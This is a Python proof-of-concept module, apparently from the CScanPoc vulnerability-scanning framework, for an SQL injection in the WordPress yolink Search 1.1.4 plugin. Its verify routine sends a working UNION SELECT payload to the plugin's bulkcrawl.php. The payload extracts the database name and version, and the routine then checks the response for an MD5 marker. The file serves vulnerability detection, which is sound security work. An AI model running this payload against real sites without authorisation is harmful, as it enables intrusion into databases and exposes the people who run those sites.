# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'WordPress_0067'  # 平台漏洞编号，留空
    name = 'WordPress Plugin yolink Search 1.1.4 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2011-08-30'  # 漏洞公布时间
    desc = '''
        WordPress Plugin yolink Search 1.1.4 SQL注入漏洞
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/17757/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Plugin yolink Search 1.1.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6d61d0df-863a-4001-bd5f-85b056790bea'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = (
                "/wp-content/plugins/yolink-search/includes/bulkcrawl.php")
            target_url = arg + payload
            post_v1 = "page=-1"
            post_v2 = "from_id=-1%20UNION%20ALL%20SELECT%20CONCAT_WS(CHAR(58),database(),version(),MD5(3.14)),NULL--%20&batch_size=-1%20"
            res = requests.post(target_url, data=post_v1+post_v2)
            if res.status_code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
